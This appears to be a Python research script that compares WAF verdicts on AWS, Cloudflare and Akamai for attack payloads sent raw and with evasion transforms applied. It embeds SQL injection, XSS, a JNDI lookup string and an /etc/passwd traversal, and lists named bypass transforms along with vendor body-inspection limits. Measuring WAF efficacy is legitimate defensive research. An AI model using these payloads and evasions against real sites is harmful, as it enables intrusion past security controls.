"""Map each bypass technique to measured viability per WAF.

For every transform, send the same attack vector raw (baseline) and then
with ONLY that one transform applied. Compare verdicts and record what the
origin actually saw. This is the empirical half of the viability matrix; the
documented half lives in docs/research/viability.md.

A transform is only measured as a bypass when the RAW baseline is BLOCKED on
that vendor. When the ruleset does not fire on the vector at all, the cell is
honest NO-BASELINE - there is nothing to bypass on that property.

Output columns:
  vendor, technique, raw, xform, origin, note
where raw/xform are verdicts (DELIVERED/BLOCKED/CHALLENGE/UNKNOWN/INAPPLICABLE)
and origin is what the echo app reflected after the transform.
"""
from __future__ import annotations

import argparse
import json
import sys
import tomllib
from pathlib import Path
from urllib.parse import quote

import requests

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "src"))

from waf_requests.blockpage import classify  # noqa: E402
from waf_requests.spec import ReqSpec, to_prepared  # noqa: E402
from waf_requests.transforms import Ctx, TRANSFORMS  # noqa: E402

SQLI = "' OR '1'='1"
XSS = "<script>alert(1)</script>"
JNDI = "${jndi:ldap://x.example.com/a}"
TRAV = "../../../../etc/passwd"

#: Body-pad target per vendor. AWS measured window ~16381 bytes on the
#: CloudFront-scoped property, so pads must exceed it; profile default 8192 is
#: the ALB figure and is too small for this deployment.
BODY_LIMIT = {"aws": 20000, "cloudflare": 131072, "akamai": 8192}


def _q(base: str, payload: str) -> ReqSpec:
    return ReqSpec("GET", f"{base}/search?q={quote(payload, safe='')}", {}, None)


def _q2(base: str, payload: str) -> ReqSpec:
    return ReqSpec("GET", f"{base}/search?a=1&q={quote(payload, safe='')}", {}, None)


def _json(base: str, payload: str) -> ReqSpec:
    body = json.dumps({"q": payload}).encode()
    return ReqSpec("POST", f"{base}/echo",
                   {"Content-Type": "application/json"}, body)


def _form(base: str, payload: str) -> ReqSpec:
    body = ("q=" + quote(payload, safe="")).encode()
    return ReqSpec("POST", f"{base}/echo",
                   {"Content-Type": "application/x-www-form-urlencoded"}, body)


def _multipart(base: str, payload: str) -> ReqSpec:
    b = "XyZ123"
    body = (
        f"--{b}\r\n"
        'Content-Disposition: form-data; name="q"\r\n\r\n'
        f"{payload}\r\n"
        f"--{b}--\r\n"
    ).encode()
    return ReqSpec("POST", f"{base}/upload",
                   {"Content-Type": f"multipart/form-data; boundary={b}"}, body)


def _multipart2(base: str, payload: str) -> ReqSpec:
    b = "B2"
    body = (
        f"--{b}\r\n"
        'Content-Disposition: form-data; name="token"\r\n\r\n'
        "abc\r\n"
        f"--{b}\r\n"
        'Content-Disposition: form-data; name="q"\r\n\r\n'
        f"{payload}\r\n"
        f"--{b}--\r\n"
    ).encode()
    return ReqSpec("POST", f"{base}/upload",
                   {"Content-Type": f"multipart/form-data; boundary={b}"}, body)


def _ua(base: str, payload: str) -> ReqSpec:
    return ReqSpec("GET", f"{base}/search?q=x", {"User-Agent": payload}, None)


#: (transform_id, vector_builder, payload). A vector is chosen so the raw
#: baseline blocks on at least one vendor and the transform applies cleanly.
PROBES: "list[tuple[str, object, str]]" = [
    ("pad_json_ws", _json, SQLI),
    ("json_unicode_escape", _json, SQLI),
    ("gzip_body", _json, SQLI),
    ("deflate_body", _json, SQLI),
    ("json_dup_key_lastwins", _json, SQLI),
    ("json_deep_nest_wrap", _json, SQLI),
    ("json_comment_inject", _json, SQLI),
    ("pad_form_param", _form, SQLI),
    ("pad_multipart_decoy", _multipart, SQLI),
    ("multipart_boundary_variance", _multipart, SQLI),
    ("multipart_payload_last", _multipart2, SQLI),
    ("percent_double_encode", _q, SQLI),
    ("hpp_duplicate_param", _q, SQLI),
    ("hpp_semicolon_sep", _q2, SQLI),
    ("method_override", _q, SQLI),
    ("charset_utf7", _json, SQLI),
    ("header_pad_early", _ua, XSS),
    ("dup_header_firstlast", _ua, XSS),
    ("spoof_trusted_ip", _ua, XSS),
]


def _reflected(resp_text: str, payload: str) -> bool:
    probe = "".join(payload.lower().split())
    from urllib.parse import unquote

    decoded = resp_text.lower()
    for _ in range(8):
        if probe in "".join(decoded.split()):
            return True
        step = unquote(decoded)
        if step == decoded:
            break
        decoded = step
    return False


def _origin(resp, payload: str) -> str:
    if classify(resp).status.name != "DELIVERED":
        return "-"
    strong = resp.headers.get("X-Origin-Saw-Payload", "")
    if strong:
        return f"header:{strong}"
    if _reflected(resp.text, payload):
        return "reflected"
    return "not-reflected"


def _send(session: requests.Session, spec: ReqSpec, timeout: float) -> requests.Response:
    return session.send(to_prepared(spec), timeout=timeout)


def run_probe(vendor: str, base: str, transform_id: str, builder, payload: str,
              timeout: float, raw_session: requests.Session) -> tuple:
    """Return (raw_verdict, xform_verdict, origin, note)."""
    spec = builder(base, payload)
    transform = TRANSFORMS[transform_id]
    limit = BODY_LIMIT.get(vendor, 8192)
    out = transform.apply(spec, Ctx(profile_limit=limit))  # type: ignore[attr-defined]
    if out is None:
        return "SKIP", "INAPPLICABLE", "-", "transform returned None"
    try:
        raw_resp = _send(raw_session, spec, timeout)
    except requests.RequestException as exc:
        return "SKIP", "SKIP", "-", f"raw {exc.__class__.__name__}"
    raw_verdict = classify(raw_resp).status.value
    try:
        x_resp = _send(raw_session, out, timeout)
    except requests.RequestException as exc:
        return raw_verdict, "SKIP", "-", f"xform {exc.__class__.__name__}"
    x_verdict = classify(x_resp).status.value
    origin = _origin(x_resp, payload)
    note = f"raw_http={raw_resp.status_code} xform_http={x_resp.status_code}"
    return raw_verdict, x_verdict, origin, note


def run_host(vendor: str, entry: dict, raw_session: requests.Session) -> "list[tuple]":
    base = (entry.get("base") or "").strip().rstrip("/")
    rows = []
    if not base:
        for tid, _, _ in PROBES:
            rows.append((vendor, tid, "SKIP", "-", "-", "base empty"))
        return rows
    try:
        raw_session.get(f"{base}/search", params={"q": "ping"}, timeout=15)
    except requests.RequestException:
        for tid, _, _ in PROBES:
            rows.append((vendor, tid, "SKIP", "-", "-", "unreachable"))
        return rows
    for tid, builder, payload in PROBES:
        raw_v, x_v, origin, note = run_probe(
            vendor, base, tid, builder, payload, 30.0, raw_session,
        )
        rows.append((vendor, tid, raw_v, x_v, origin, note))
        print(f"   [{tid:<24}] raw={raw_v:<9} xform={x_v:<12} origin={origin:<12} {note}")
    return rows


def resolve_targets_path(explicit: "str | None") -> Path:
    if explicit:
        return Path(explicit)
    import os

    env = os.environ.get("WAF_TARGETS_FILE")
    if env:
        return Path(env)
    here = Path(__file__).parent
    local = here / "waf_targets.local.toml"
    return local if local.exists() else here / "waf_targets.example.toml"


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--targets", default=None)
    parser.add_argument("--vendor", default=None, choices=["aws", "cloudflare", "akamai"])
    args = parser.parse_args()

    targets_path = resolve_targets_path(args.targets)
    config = tomllib.loads(targets_path.read_text())
    raw_session = requests.Session()

    all_rows: "list[tuple]" = []
    for vendor, entry in config.items():
        if args.vendor and vendor != args.vendor:
            continue
        base = (entry.get("base") or "").strip().rstrip("/")
        print(f"== {vendor}: {base or '(no base)'}")
        all_rows.extend(run_host(vendor, entry or {}, raw_session))

    print()
    print(f"{'vendor':<11} {'technique':<26} {'raw':<10} {'xform':<12} {'origin':<13} note")
    for row in all_rows:
        vendor, tid, raw_v, x_v, origin, note = row
        print(f"{vendor:<11} {tid:<26} {raw_v:<10} {x_v:<12} {origin:<13} {note}")

    bypass = sum(1 for r in all_rows if r[2] == "BLOCKED" and r[3] == "DELIVERED")
    no_effect = sum(1 for r in all_rows if r[2] == "BLOCKED" and r[3] == "BLOCKED")
    no_baseline = sum(1 for r in all_rows if r[2] == "DELIVERED")
    skip = sum(1 for r in all_rows if r[2] == "SKIP")
    print(f"\nbypass={bypass} no-effect={no_effect} no-baseline={no_baseline} "
          f"skip={skip} total={len(all_rows)}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
